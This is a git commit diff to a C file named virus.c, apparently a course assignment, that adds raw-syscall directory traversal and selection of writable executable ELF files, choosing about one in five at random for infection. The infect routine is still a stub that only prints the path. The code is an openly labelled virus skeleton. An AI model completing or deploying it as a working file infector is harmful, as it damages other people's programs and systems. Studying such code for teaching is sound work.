a40151616a3b21880ce909fa810af0f9977310f2
Seungyeop Lee <2dvorak@kaist.ac.kr>
2018-04-30 09:08:18 +0900

    Update virus.c, it's now working

--- src/virus.c
+++ src/virus.c
@@ -2,7 +2,9 @@
 
 #define ROOT_DIR   (".")
 #define SPARE_FDS  (4)
-#define MAX_FDS    (512)
+#define MAX_FDS	(512)
+
+#define DEBUG 	1
 
 // types.h
 
@@ -12,6 +14,9 @@ typedef unsigned long int uintptr; /* size_t */
 typedef long int intptr; /* ssize_t */
 
 // end types.h
+
+uintptr my_strlen(char const* str);
+void infect(const char* fpath);
 
 // elf.h
 
@@ -52,16 +57,47 @@ typedef struct elf64_hdr {
 
 // end elf.h
 
+
+// resource.h
+
+#define	RLIMIT_OFILE	8
+
+struct rlimit {
+	unsigned long	rlim_cur;		/* current (soft) limit */
+	unsigned long	rlim_max;		/* maximum value for rlim_cur */
+};
+
+// end resource.h
+
+// dirent.h
+
+struct linux_dirent {
+	unsigned long  d_ino;	 /* Inode number */
+	unsigned long  d_off;	 /* Offset to next linux_dirent */
+	unsigned short d_reclen;  /* Length of this linux_dirent */
+	char		   d_name[];  /* Filename (null-terminated) */
+						/* length is actually (d_reclen - 2 -
+						   offsetof(struct linux_dirent, d_name) */
+	/*
+	char		   pad;	   // Zero padding byte
+	char		   d_type;	// File type (only since Linux 2.6.4;
+							  // offset is (d_reclen - 1))
+	*/
+
+};
+
+// end dirent.h
+
 // syscall.h
-#define SYS_READ    0
+#define SYS_READ	0
 #define SYS_WRITE   1
-#define SYS_OPEN    2
+#define SYS_OPEN	2
 #define SYS_CLOSE   3
-#define SYS_STAT    4
+#define SYS_STAT	4
 #define SYS_FSTAT   5
-#define SYS_MMAP    9
+#define SYS_MMAP	9
 #define SYS_GETPID  39
-#define SYS_GETDENTS    78
+#define SYS_GETDENTS	78
 #define SYS_GETCWD  79
 #define SYS_GETRLIMIT   97
 #define SYS_PTRACE  101
@@ -80,51 +116,53 @@ intptr open(const char *filename, intptr flags);
 intptr close(int fd);
 intptr getuid();
 intptr getrlimit(unsigned int resource, struct rlimit *rlim);
+intptr getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+intptr getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
 void* syscall5(
-    void* number,
-    void* arg1,
-    void* arg2,
-    void* arg3,
-    void* arg4,
-    void* arg5
+	void* number,
+	void* arg1,
+	void* arg2,
+	void* arg3,
+	void* arg4,
+	void* arg5
 );
 
 void* syscall4(
-    void* number,
-    void* arg1,
-    void* arg2,
-    void* arg3,
-    void* arg4
+	void* number,
+	void* arg1,
+	void* arg2,
+	void* arg3,
+	void* arg4
 );
 
 void* syscall3(
-    void* number,
-    void* arg1,
-    void* arg2,
-    void* arg3
+	void* number,
+	void* arg1,
+	void* arg2,
+	void* arg3
 );
 
 void* syscall2(
-    void* number,
-    void* arg1,
-    void* arg2
+	void* number,
+	void* arg1,
+	void* arg2
 );
 
 void* syscall1(
-    void* number,
-    void* arg1
+	void* number,
+	void* arg1
 );
 
 void* syscall(
-    void* number
+	void* number
 );
 
 // end syscall.h
 
 // stdio.h
 
-#define NULL    0
+#define NULL	0
 int my_memcmp(const unsigned char *str1, const unsigned char *str2, size_t count);
 
 // end stdio.h
@@ -195,36 +233,22 @@ struct stat
 #define	O_RDWR		0x0002		/* open for reading and writing */
 #define	O_ACCMODE	0x0003		/* mask for above modes */
 
-
-/*
- * Kernel encoding of open mode; separate read and write bits
- * that are independently testable: 1 greater than the above.
- */
-
-#define	O_NONBLOCK	0x0004		/* no delay */
-#define	O_APPEND	0x0008		/* set append mode */
-
-#define	O_SHLOCK	0x0010		/* open with shared file lock */
-#define	O_EXLOCK	0x0020		/* open with exclusive file lock */
-#define	O_ASYNC		0x0040		/* signal pgrp when data ready */
-#define	O_FSYNC		0x0080		/* synchronous writes */
-
-#define	O_CREAT		0x0200		/* create if nonexistant */
-#define	O_TRUNC		0x0400		/* truncate to zero length */
-#define	O_EXCL		0x0800		/* error if already exists */
+#define O_CREAT		00000100	/* not fcntl */
+#define O_EXCL		00000200	/* not fcntl */
+#define O_NOCTTY	00000400	/* not fcntl */
+#define O_TRUNC		00001000	/* not fcntl */
+#define O_APPEND	00002000
+#define O_NONBLOCK	00004000
+#define O_DSYNC		00010000	/* used to be O_SYNC, see below */
+#define FASYNC		00020000	/* fcntl, for BSD compatibility */
+#define O_DIRECT	00040000	/* direct disk access hint */
+#define O_LARGEFILE	00100000
+#define O_DIRECTORY	00200000	/* must be a directory */
+#define O_NOFOLLOW	00400000	/* don't follow links */
+#define O_NOATIME	01000000
+#define O_CLOEXEC	02000000	/* set close_on_exec */
 
 // end fcntl.h
-
-// resource.h
-
-#define	RLIMIT_OFILE	8
-
-struct rlimit {
-	long	rlim_cur;		/* current (soft) limit */
-	long	rlim_max;		/* maximum value for rlim_cur */
-};
-
-// end resource.h
 
 // ftw.h
 
@@ -257,7 +281,7 @@ struct FTW {
 
 // fts.h
 
-typedef struct {
+typedef struct _fts {
 	struct _ftsent *fts_cur;	/* current node */
 	struct _ftsent *fts_child;	/* linked list of children */
 	struct _ftsent **fts_array;	/* sort array */
@@ -287,8 +311,8 @@ typedef struct _ftsent {
 	struct _ftsent *fts_cycle;	/* cycle node */
 	struct _ftsent *fts_parent;	/* parent directory */
 	struct _ftsent *fts_link;	/* next file in directory */
-	long fts_number;	        /* local numeric value */
-	void *fts_pointer;	        /* local address value */
+	long fts_number;			/* local numeric value */
+	void *fts_pointer;			/* local address value */
 	char *fts_accpath;		/* access path */
 	char *fts_path;			/* root path */
 	int fts_errno;			/* errno for this node */
@@ -340,82 +364,116 @@ typedef struct _ftsent {
 // limits.h
 
 #define	_POSIX_OPEN_MAX		20
-#define OPEN_MAX            _POSIX_OPEN_MAX
+#define OPEN_MAX			_POSIX_OPEN_MAX
 
 // end limits.h
+
+// fs.h
+
+#define DT_UNKNOWN	0
+#define DT_FIFO		1
+#define DT_CHR		2
+#define DT_DIR		4
+#define DT_BLK		6
+#define DT_REG		8
+#define DT_LNK		10
+#define DT_SOCK		12
+#define DT_WHT		14
+
+// end fs.h
 
 // syscall.c
 
 intptr read(int fd, char *buf, uintptr nbytes)
 {
-    return (intptr)
-        syscall3(
-            (void*)SYS_READ,
-            (void*)(intptr)fd,
-            (void*)buf,
-            (void*)nbytes
-        );
+	return (intptr)
+		syscall3(
+			(void*)SYS_READ,
+			(void*)(intptr)fd,
+			(void*)buf,
+			(void*)nbytes
+		);
 }
 
-//static
 intptr write(int fd, void const* data, uintptr nbytes)
 {
-    return (intptr)
-        syscall3(
-            (void*)SYS_WRITE,
-            (void*)(intptr)fd,
-            (void*)data,
-            (void*)nbytes
-        );
+	return (intptr)
+		syscall3(
+			(void*)SYS_WRITE,
+			(void*)(intptr)fd,
+			(void*)data,
+			(void*)nbytes
+		);
 }
 
-//static
 intptr open3(const char *filename, intptr flags, intptr mode)
 {
-    return (intptr)
-        syscall3(
-            (void*)SYS_OPEN,
-            (void*)filename,
-            (void*)flags,
-            (void*)mode
-        );
+	return (intptr)
+		syscall3(
+			(void*)SYS_OPEN,
+			(void*)filename,
+			(void*)flags,
+			(void*)mode
+		);
 }
 
 intptr open(const char *filename, intptr flags)
 {
-    return (intptr)
-        syscall2(
-            (void*)SYS_OPEN,
-            (void*)filename,
-            (void*)flags
-        );
+	return (intptr)
+		syscall2(
+			(void*)SYS_OPEN,
+			(void*)filename,
+			(void*)flags
+		);
 }
 
 intptr close(int fd)
 {
-    return (intptr)
-        syscall1(
-            (void*)SYS_CLOSE,
-            (void*)(intptr)fd
-        );
+	return (intptr)
+		syscall1(
+			(void*)SYS_CLOSE,
+			(void*)(intptr)fd
+		);
 }
 
 intptr getuid()
 {
-    return (intptr)
-        syscall(
-            (void*)SYS_GETUID
-        );
+	return (intptr)
+		syscall(
+			(void*)SYS_GETUID
+		);
 }
 
 intptr getrlimit(unsigned int resource, struct rlimit *rlim)
 {
-    return (intptr)
-        syscall2(
-            (void*)SYS_GETRLIMIT,
-            (void*)(uintptr)resource,
-            (void*)rlim
-        );
+	return (intptr)
+		syscall2(
+			(void*)SYS_GETRLIMIT,
+			(void*)(unsigned long)resource,
+			(void*)rlim
+		);
+}
+
+intptr getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+{
+	return (intptr)
+		syscall3(
+			(void*)SYS_GETDENTS,
+			(void*)(unsigned long)fd,
+			(void*)dirp,
+			(void*)(unsigned long)count
+		);
+}
+
+intptr getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+{
+	return (intptr)
+		syscall3(
+			(void*)SYS_GETDENTS64,
+			(void*)(unsigned long)fd,
+			(void*)dirp,
+			(void*)(unsigned long)count
+		);
 }
 
 // end syscall.c
@@ -428,10 +486,10 @@ int my_memcmp(const unsigned char *str1, const unsigned char *str2, size_t count
   register const unsigned char *s2 = (const unsigned char*)str2;
 
   while (count-- > 0)
-    {
-      if (*s1++ != *s2++)
+	{
+	  if (*s1++ != *s2++)
 	  return s1[-1] < s2[-1] ? -1 : 1;
-    }
+	}
   return 0;
 }
 
@@ -441,25 +499,83 @@ int my_memcmp(const unsigned char *str1, const unsigned char *str2, size_t count
 
 int getdtablesize()
 {
-    struct rlimit r;
-    if (getrlimit(RLIMIT_OFILE, &r) < 0) {
-        return -1;
-    }
-    return r.rlim_cur;
+	struct rlimit r;
+	if (getrlimit(RLIMIT_OFILE, &r) < 0) {
+		return -1;
+	}
+	return r.rlim_cur;
 }
 
 // end resource.c
 
 // nftw.c
 
-int
-nftw(const char *path, int (*fn)(const char *, const struct stat *, int,
-     struct FTW *), int nfds, int ftwflags)
+int nftw(const char *path, int (*fn)(const char *, const struct stat *, int, struct FTW *), int nfds)
 {
-	char * const paths[2] = { (char *)path, NULL };
+	//char * const paths[2] = { (char *)path, NULL };
+	int fd;
+	int nread;
+	char buf[32768];
+	struct linux_dirent *d;
+	int bpos;
+	char d_type;
+
+	if((fd = open(path, O_RDONLY | O_DIRECTORY)) < 0) {
+		return -1;
+	}
 	
-	
-	return (error);
+	for ( ; ; ) {
+		nread = getdents(fd, (struct linux_dirent*)buf, 32768);
+		if (nread == -1) {
+			return -1;
+		}
+
+		if (nread == 0) {
+			break;
+		}
+
+		write(1, "--------------- dirent -----------\n",my_strlen("--------------- dirent -----------\n"));
+		write(1, "file type   d_name\n", my_strlen("file type   d_name\n"));
+		for (bpos = 0; bpos < nread;) {
+			d = (struct linux_dirent *) (buf + bpos);
+			//write(1, "%8ld  ", d->d_ino);
+			d_type = *(buf + bpos + d->d_reclen - 1);
+
+			if(d_type == DT_REG) {
+				write(1, "regular", my_strlen("regular"));
+			} else if(d_type == DT_DIR) {
+				write(1, "directory", my_strlen("directory"));
+			} else if(d_type == DT_FIFO) {
+				write(1, "FIFO", my_strlen("FIFO"));
+			} else if(d_type == DT_SOCK) {
+				write(1, "socket", my_strlen("socket"));
+			} else if(d_type == DT_LNK) {
+				write(1, "symlink", my_strlen("symlink"));
+			} else if(d_type == DT_BLK) {
+				write(1, "block dev", my_strlen("block dev"));
+			} else if(d_type == DT_CHR) {
+				write(1, "char dev", my_strlen("char dev"));
+			} else if(d_type == DT_UNKNOWN) {
+				write(1, "unknown", my_strlen("unknown"));
+			} else {
+				write(1, "???", my_strlen("???"));
+			}
+			//printf("%4d %10lld  %s\n", d->d_reclen,(long long) d->d_off, d->d_name);
+			//write(1, "\t", 1);
+			//char c = '0' + d_type / 100;
+			//write(1, &c, 1);
+			//c = '0' + (d_type / 10) % 10;
+			//write(1, &c, 1);
+			//c = '0' + d_type % 10;
+			//write(1, &c, 1);
+			write(1, "\t", 1);
+			write(1, d->d_name, my_strlen(d->d_name));
+			write(1, "\n", 1);
+			bpos += d->d_reclen;
+		}
+	}
+
+	return 0;
 }
 
 // end nftw.c
@@ -469,104 +585,111 @@ void infect(const char* fpath);
 
 int can_execute(const struct stat *sb, const char* fpath)
 {
-    return (sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
-        || (sb->st_mode & S_IXOTH);
+	return (sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
+		|| (sb->st_mode & S_IXOTH);
 }
 
 int can_write(const struct stat *sb, const char* fpath)
 {
-    return (sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
-        || (sb->st_mode & S_IWOTH);
+	return (sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
+		|| (sb->st_mode & S_IWOTH);
 }
 
 int is_elf(const char* fpath)
 {
-    Elf64_Ehdr header; // Assuming 64-bit ELF file.
-    size_t nb;
-    int ret = 0;
-    //FILE* f;
-    int f;
+	Elf64_Ehdr header; // Assuming 64-bit ELF file.
+	size_t nb;
+	int ret = 0;
+	//FILE* f;
+	int f;
 
-    //f = fopen(fpath, "rb");
-    f = open(fpath, O_RDWR | O_TRUNC);
-    //f = open(fpath, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
-    if (!f) return 0;
+	//f = fopen(fpath, "rb");
+	f = open(fpath, O_RDWR | O_TRUNC);
+	//f = open(fpath, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
+	if (!f) return 0;
 
-    //nb = fread(&header, 1, sizeof(header), f);
-    nb = read(f, (char*)&header, sizeof(header));
-    if (nb == sizeof(header)) {
-        if (my_memcmp(header.e_ident, magic, sizeof(magic)) == 0) {
-            ret = 1;
-        }
-    }
-    //fclose(f);
-    close(f);
+	//nb = fread(&header, 1, sizeof(header), f);
+	nb = read(f, (char*)&header, sizeof(header));
+	if (nb == sizeof(header)) {
+		if (my_memcmp(header.e_ident, magic, sizeof(magic)) == 0) {
+			ret = 1;
+		}
+	}
+	//fclose(f);
+	close(f);
 
-    return ret;
+	return ret;
 }
 
 int random_pick()
 {
-    int rand = 0;
-    int f;
-    f = open("/dev/urandom", O_RDONLY);
-    read(f, (char*)&rand, 1);
-    close(f);
-    return rand % 5 == 0; // We infect roughly 1/5 of the binaries.
+	int rand = 0;
+	int f;
+	f = open("/dev/urandom", O_RDONLY);
+	read(f, (char*)&rand, 1);
+	close(f);
+	
+	if(DEBUG) {
+		write(1, "[DEBUG] rand : ", my_strlen("[DEBUG] rand : "));
+		char c = '0' + rand % 5;
+		write(1, &c, 1);
+		write(1, "\n", 1);
+	}
+	return rand % 5 == 0; // We infect roughly 1/5 of the binaries.
 }
 
 int file_process(const char *fpath,
-                 const struct stat *sb,
-                 int flag,
-                 struct FTW *s)
+				 const struct stat *sb,
+				 int flag,
+				 struct FTW *s)
 {
-    int ret = 0;
+	int ret = 0;
 
-    if (flag == FTW_F
-        && can_execute(sb, fpath)
-        && can_write(sb, fpath)
-        && is_elf(fpath)
-        && random_pick())
-    {
-        infect(fpath);
-    }
+	if (flag == FTW_F
+		&& can_execute(sb, fpath)
+		&& can_write(sb, fpath)
+		&& is_elf(fpath)
+		&& random_pick())
+	{
+		infect(fpath);
+	}
 
-    return ret;
+	return ret;
 }
 
 int main(int argc, char* argv[])
 {
-    //struct timeval t;
-    int nfds = getdtablesize() - SPARE_FDS;
-    if(nfds == -5) return -1;
-    nfds = nfds > MAX_FDS ? MAX_FDS : nfds;
+	//struct timeval t;
+	int nfds = getdtablesize() - SPARE_FDS;
+	if(nfds == -5) return -1;
+	nfds = nfds > MAX_FDS ? MAX_FDS : nfds;
 
-    //gettimeofday(&t, NULL);
-    //srand(t.tv_usec * t.tv_sec);
-    nftw(ROOT_DIR, file_process, nfds, FTW_PHYS);
-    //write(1, "hello from libc-free world\n", 27);
-    return 0;
+	//gettimeofday(&t, NULL);
+	//srand(t.tv_usec * t.tv_sec);
+	nftw(ROOT_DIR, file_process, nfds);
+	//write(1, "hello from libc-free world\n", 27);
+	return 0;
 }
 
 ///////////////////////////////////////////////////////////////////////////////
 ///////////////////////////////////////////////////////////////////////////////
-//      The above logic is an example, and you can freely modify it. Note that
-//      you should make the above logic work without calling libc functions.
+//	  The above logic is an example, and you can freely modify it. Note that
+//	  you should make the above logic work without calling libc functions.
 ///////////////////////////////////////////////////////////////////////////////
 ///////////////////////////////////////////////////////////////////////////////
 
 uintptr my_strlen(char const* str)
 {
-    char const* p;
-    for (p = str; *p; ++p);
-    return p - str;
+	char const* p;
+	for (p = str; *p; ++p);
+	return p - str;
 }
 
 // FIXME: your infection logic should be placed here and below.
 void infect(const char* fpath)
 {
-    //printf("%s will be infected.\n", fpath);
-    write(1, fpath, my_strlen(fpath));
-    write(1, " will be infected.\n", my_strlen(" will be infected.\n"));
+	//printf("%s will be infected.\n", fpath);
+	write(1, fpath, my_strlen(fpath));
+	write(1, " will be infected.\n", my_strlen(" will be infected.\n"));
 }
 
